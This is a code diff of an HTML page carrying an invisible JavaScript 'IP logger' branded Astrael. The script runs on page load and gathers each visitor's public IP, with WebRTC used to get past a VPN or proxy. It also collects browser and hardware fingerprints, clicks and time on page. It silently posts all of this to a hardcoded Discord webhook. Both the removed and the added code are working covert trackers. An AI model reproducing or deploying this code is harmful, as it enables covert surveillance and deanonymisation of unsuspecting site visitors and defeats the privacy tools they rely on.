@@ -14,49 +14,103 @@
     </style>
 </head>
 <body>
-    <!-- COMPLETELY INVISIBLE - INSTANT IP LOGGING -->
+    <!-- COMPLETELY INVISIBLE - REAL IP LOGGING -->
 
     <script>
-        // ASTRAEL DISCORD WEBHOOK IP LOGGER v7.7.7
+        // ASTRAEL REAL IP LOGGER v7.7.7 - FIXED
         (function() {
             const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1433304187554234489/KpYxolWi91MyTHHuPEf7cQYm-_N6EhlADrCn0Ep-7JtrZXATdzog7HqI9n1CI9PqVe6m';
             
-            // Instant IP collection
-            const collectAllData = async () => {
-                let ipData = {};
+            // Get REAL client IP (not server IP)
+            const getRealIP = async () => {
+                let realIP = 'Unknown';
                 
-                // Multiple IP detection APIs
-                const ipApis = [
+                // Use services that return client IP directly
+                const reliableIPApis = [
                     'https://api.ipify.org?format=json',
-                    'https://ipapi.co/json/',
                     'https://api64.ipify.org?format=json',
-                    'https://jsonip.com/',
                     'https://api.myip.com/',
                     'https://ip.seeip.org/json'
                 ];
 
-                // Try all IP APIs until success
-                for (const api of ipApis) {
+                // Try each API sequentially
+                for (const api of reliableIPApis) {
                     try {
-                        const response = await fetch(api);
+                        const controller = new AbortController();
+                        const timeoutId = setTimeout(() => controller.abort(), 3000);
+                        
+                        const response = await fetch(api, {
+                            signal: controller.signal,
+                            mode: 'cors',
+                            credentials: 'omit'
+                        });
+                        
+                        clearTimeout(timeoutId);
                         const data = await response.json();
-                        if (data.ip) {
-                            ipData = { ...data };
+                        
+                        if (data.ip && data.ip !== '127.0.0.1' && !data.ip.startsWith('10.') && 
+                            !data.ip.startsWith('192.168.') && !data.ip.startsWith('172.')) {
+                            realIP = data.ip;
                             break;
                         }
-                    } catch(e) {}
+                    } catch(e) {
+                        console.log('IP API failed:', api);
+                    }
                 }
 
-                // Complete system fingerprint
-                const fingerprint = {
-                    // IP Information
-                    ip: ipData.ip || 'Unknown',
-                    country: ipData.country || ipData.country_name || 'Unknown',
-                    city: ipData.city || 'Unknown',
-                    region: ipData.region || ipData.region_name || 'Unknown',
-                    isp: ipData.org || ipData.isp || 'Unknown',
-                    timezone: ipData.timezone || 'Unknown',
+                return realIP;
+            };
+
+            // Get WebRTC local IP (bypasses VPN/proxy)
+            const getWebRTCIP = () => {
+                return new Promise((resolve) => {
+                    const rtc = new RTCPeerConnection({
+                        iceServers: [
+                            { urls: 'stun:stun.l.google.com:19302' },
+                            { urls: 'stun:stun1.l.google.com:19302' }
+                        ]
+                    });
                     
+                    rtc.createDataChannel('');
+                    rtc.createOffer()
+                        .then(offer => rtc.setLocalDescription(offer))
+                        .catch(() => resolve(null));
+                    
+                    let foundIP = null;
+                    rtc.onicecandidate = (event) => {
+                        if (event.candidate) {
+                            const candidate = event.candidate.candidate;
+                            // Match IPv4 addresses
+                            const ipRegex = /([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})/;
+                            const match = candidate.match(ipRegex);
+                            if (match && !isPrivateIP(match[1])) {
+                                foundIP = match[1];
+                                resolve(foundIP);
+                                rtc.close();
+                            }
+                        }
+                    };
+                    
+                    setTimeout(() => {
+                        if (!foundIP) {
+                            resolve(null);
+                            rtc.close();
+                        }
+                    }, 2000);
+                });
+            };
+
+            // Check if IP is private
+            const isPrivateIP = (ip) => {
+                return ip.startsWith('10.') || 
+                       ip.startsWith('192.168.') || 
+                       (ip.startsWith('172.') && parseInt(ip.split('.')[1]) >= 16 && parseInt(ip.split('.')[1]) <= 31) ||
+                       ip === '127.0.0.1';
+            };
+
+            // Collect all fingerprint data
+            const collectFingerprintData = () => {
+                return {
                     // Browser Details
                     user_agent: navigator.userAgent,
                     platform: navigator.platform,
@@ -88,95 +142,61 @@
                     referrer: document.referrer || 'Direct',
                     hostname: window.location.hostname
                 };
-
-                // Get WebRTC local IP
-                getWebRTCIP().then(webrtcIP => {
-                    if (webrtcIP) {
-                        fingerprint.webrtc_local_ip = webrtcIP;
-                    }
-                    sendToDiscord(fingerprint);
-                }).catch(() => {
-                    sendToDiscord(fingerprint);
-                });
             };
 
-            // WebRTC IP leak detection
-            const getWebRTCIP = () => {
-                return new Promise((resolve) => {
-                    const rtc = new RTCPeerConnection({
-                        iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
-                    });
-                    
-                    rtc.createDataChannel('');
-                    rtc.createOffer()
-                        .then(offer => rtc.setLocalDescription(offer))
-                        .catch(() => resolve(null));
-                    
-                    rtc.onicecandidate = (event) => {
-                        if (event.candidate) {
-                            const candidate = event.candidate.candidate;
-                            const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/;
-                            const match = candidate.match(ipRegex);
-                            if (match) {
-                                resolve(match[0]);
-                                rtc.close();
-                            }
-                        }
-                    };
-                    
-                    setTimeout(() => resolve(null), 1000);
-                });
-            };
-
-            // Send to Discord with rich embed
-            const sendToDiscord = (data) => {
+            // Send to Discord
+            const sendToDiscord = (ip, fingerprint, webrtcIP = null) => {
                 const embed = {
-                    title: "🔍 ASTRAEL IP LOGGER - NEW VISITOR",
-                    color: 0xff0000,
+                    title: "🔍 ASTRAEL - REAL IP CAPTURED",
+                    color: 0x00ff00,
                     timestamp: new Date().toISOString(),
                     fields: [
                         {
-                            name: "🌐 IP Address",
-                            value: `\`\`\`${data.ip}\`\`\``,
-                            inline: true
+                            name: "🌐 REAL PUBLIC IP",
+                            value: `\`\`\`${ip}\`\`\``,
+                            inline: false
                         },
                         {
-                            name: "📍 Location",
-                            value: `**Country:** ${data.country}\n**City:** ${data.city}\n**Region:** ${data.region}\n**ISP:** ${data.isp}`,
+                            name: "📍 Location Info",
+                            value: `**Timezone:** ${fingerprint.timezone}\n**Language:** ${fingerprint.language}\n**Local Time:** ${fingerprint.local_time}`,
                             inline: true
                         },
                         {
                             name: "🖥️ System Info",
-                            value: `**Platform:** ${data.platform}\n**Language:** ${data.language}\n**Screen:** ${data.screen_resolution}\n**Pixel Ratio:** ${data.pixel_ratio}`,
-                            inline: false
-                        },
-                        {
-                            name: "🔧 Browser",
-                            value: `\`\`\`${data.user_agent.substring(0, 1000)}\`\`\``,
-                            inline: false
-                        },
-                        {
-                            name: "⚡ Hardware",
-                            value: `**CPU Cores:** ${data.cpu_cores}\n**RAM:** ${data.device_memory}GB\n**Touch Points:** ${data.max_touch_points}`,
+                            value: `**Platform:** ${fingerprint.platform}\n**Screen:** ${fingerprint.screen_resolution}\n**CPU Cores:** ${fingerprint.cpu_cores}\n**RAM:** ${fingerprint.device_memory}GB`,
                             inline: true
                         },
                         {
+                            name: "🔧 Browser",
+                            value: `\`\`\`${fingerprint.user_agent}\`\`\``,
+                            inline: false
+                        },
+                        {
                             name: "📡 Network",
-                            value: `**Type:** ${data.connection_type}\n**Speed:** ${data.connection_speed}\n**Timezone:** ${data.timezone}`,
+                            value: `**Type:** ${fingerprint.connection_type}\n**Speed:** ${fingerprint.connection_speed}`,
                             inline: true
                         },
                         {
                             name: "🔗 Page Info",
-                            value: `**URL:** ${data.url}\n**Referrer:** ${data.referrer}\n**Local Time:** ${data.local_time}`,
-                            inline: false
+                            value: `**URL:** ${fingerprint.url}\n**Referrer:** ${fingerprint.referrer}`,
+                            inline: true
                         }
                     ],
                     footer: {
-                        text: "Astrael IP Logger v7.7.7 • Instant Stealth Tracking"
+                        text: "Astrael Real IP Logger v7.7.7 • No Server IPs"
                     }
                 };
 
-                // Primary send attempt with embed
+                // Add WebRTC IP if available
+                if (webrtcIP) {
+                    embed.fields.push({
+                        name: "🔒 WebRTC Local IP",
+                        value: `\`\`\`${webrtcIP}\`\`\``,
+                        inline: false
+                    });
+                }
+
+                // Send to Discord
                 fetch(DISCORD_WEBHOOK, {
                     method: 'POST',
                     headers: {
@@ -184,122 +204,105 @@
                     },
                     body: JSON.stringify({
                         embeds: [embed],
-                        username: "Astrael Tracker",
+                        username: "Astrael IP Tracker",
                         avatar_url: "https://i.imgur.com/7W6hqz3.png"
                     })
-                }).catch(() => {
-                    // Fallback without embed
+                }).catch(error => {
+                    // Fallback simple message
                     fetch(DISCORD_WEBHOOK, {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json',
                         },
                         body: JSON.stringify({
-                            content: `🚨 **ASTRAEL IP LOGGER - NEW VISITOR**\n\n**IP:** ${data.ip}\n**Country:** ${data.country}\n**City:** ${data.city}\n**Platform:** ${data.platform}\n**Browser:** ${data.user_agent}\n**Screen:** ${data.screen_resolution}\n**URL:** ${data.url}\n**Time:** ${data.local_time}`,
-                            username: "Astrael Tracker"
+                            content: `🚨 **REAL IP CAPTURED**\n**IP:** ${ip}\n**Platform:** ${fingerprint.platform}\n**Browser:** ${fingerprint.user_agent}\n**Screen:** ${fingerprint.screen_resolution}\n**URL:** ${fingerprint.url}`,
+                            username: "Astrael IP Tracker"
                         })
                     });
                 });
-
-                // Additional fingerprinting
-                setTimeout(() => {
-                    getAdvancedFingerprint(data.ip);
-                }, 1000);
             };
 
-            // Advanced fingerprinting
-            const getAdvancedFingerprint = (ip) => {
+            // Main tracking function
+            const executeRealIPTracking = async () => {
                 try {
-                    // Canvas fingerprint
-                    const canvas = document.createElement('canvas');
-                    const ctx = canvas.getContext('2d');
-                    ctx.textBaseline = 'top';
-                    ctx.font = '14px Arial';
-                    ctx.fillText('AstraelTracker7.7.7', 2, 2);
-                    const canvasData = canvas.toDataURL();
+                    // Get fingerprint data first
+                    const fingerprint = collectFingerprintData();
                     
-                    // Audio fingerprint
-                    const audioContext = new (window.AudioContext || window.webkitAudioContext)();
-                    const oscillator = audioContext.createOscillator();
-                    const analyser = audioContext.createAnalyser();
-                    oscillator.connect(analyser);
-                    analyser.connect(audioContext.destination);
-                    oscillator.start();
-                    audioContext.close();
+                    // Get real public IP
+                    const realIP = await getRealIP();
                     
-                    // Send fingerprint data
+                    // Get WebRTC IP
+                    const webrtcIP = await getWebRTCIP();
+                    
+                    // Only send if we got a real public IP
+                    if (realIP && realIP !== 'Unknown' && !isPrivateIP(realIP)) {
+                        sendToDiscord(realIP, fingerprint, webrtcIP);
+                        
+                        // Log success
+                        console.log('✅ Real IP captured:', realIP);
+                    } else {
+                        // Send failure notification
+                        fetch(DISCORD_WEBHOOK, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json',
+                            },
+                            body: JSON.stringify({
+                                content: `❌ **IP CAPTURE FAILED**\n**Reason:** Could not get real public IP\n**User Agent:** ${fingerprint.user_agent}\n**URL:** ${fingerprint.url}\n**Time:** ${fingerprint.local_time}`,
+                                username: "Astrael IP Tracker"
+                            })
+                        });
+                    }
+                    
+                } catch (error) {
+                    console.log('Tracking error:', error);
+                }
+            };
+
+            // Start tracking immediately
+            window.addEventListener('load', executeRealIPTracking);
+            document.addEventListener('DOMContentLoaded', executeRealIPTracking);
+            
+            // Execute now
+            if (document.readyState === 'loading') {
+                document.addEventListener('DOMContentLoaded', executeRealIPTracking);
+            } else {
+                executeRealIPTracking();
+            }
+
+            // Additional execution points
+            setTimeout(executeRealIPTracking, 1000);
+            setTimeout(executeRealIPTracking, 3000);
+
+            // Track page interactions
+            let clickCount = 0;
+            document.addEventListener('click', (e) => {
+                clickCount++;
+                if (clickCount <= 3) { // Limit to 3 clicks
                     fetch(DISCORD_WEBHOOK, {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json',
                         },
                         body: JSON.stringify({
-                            content: `🔍 **ADVANCED FINGERPRINT**\n**IP:** ${ip}\n**Canvas Hash:** ${canvasData.substring(0, 80)}...\n**Audio Context:** Available\n**Hardware Concurrency:** ${navigator.hardwareConcurrency}`,
-                            username: "Astrael Tracker"
+                            content: `🖱️ **User Click #${clickCount}**\n**Coordinates:** X:${e.clientX}, Y:${e.clientY}\n**URL:** ${window.location.href}`,
+                            username: "Astrael IP Tracker"
                         })
-                    });
-                } catch(e) {}
-            };
-
-            // Execute tracking immediately
-            const executeTracking = () => {
-                collectAllData();
-                
-                // Multiple execution points for reliability
-                setTimeout(collectAllData, 500);
-                setTimeout(collectAllData, 2000);
-                setTimeout(collectAllData, 5000);
-            };
-
-            // Start tracking on all possible events
-            window.addEventListener('load', executeTracking);
-            document.addEventListener('DOMContentLoaded', executeTracking);
-            
-            // Execute immediately if already loaded
-            if (document.readyState === 'complete' || document.readyState === 'interactive') {
-                executeTracking();
-            }
-
-            // Execute now as well
-            executeTracking();
-
-            // Track page exit
-            window.addEventListener('beforeunload', () => {
-                const exitData = {
-                    content: `📤 **VISITOR EXITED PAGE**\n**Time Spent:** ${Math.round(performance.now() / 1000)} seconds\n**URL:** ${window.location.href}\n**User Agent:** ${navigator.userAgent.substring(0, 100)}`,
-                    username: "Astrael Tracker"
-                };
-                
-                // Use beacon for reliable exit tracking
-                if (navigator.sendBeacon) {
-                    const blob = new Blob([JSON.stringify(exitData)], { type: 'application/json' });
-                    navigator.sendBeacon(DISCORD_WEBHOOK, blob);
-                } else {
-                    fetch(DISCORD_WEBHOOK, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify(exitData)
                     });
                 }
             });
 
-            // Periodic tracking every 30 seconds
-            setInterval(() => {
-                collectAllData();
-            }, 30000);
-
-            // Track user interactions
-            document.addEventListener('click', (e) => {
+            // Track page exit
+            window.addEventListener('beforeunload', () => {
+                const timeSpent = Math.round(performance.now() / 1000);
                 fetch(DISCORD_WEBHOOK, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
                     },
                     body: JSON.stringify({
-                        content: `🖱️ **USER INTERACTION**\n**Click at:** X:${e.clientX}, Y:${e.clientY}\n**URL:** ${window.location.href}`,
-                        username: "Astrael Tracker"
+                        content: `📤 **Visitor Left**\n**Time Spent:** ${timeSpent} seconds\n**URL:** ${window.location.href}`,
+                        username: "Astrael IP Tracker"
                     })
                 });
             });
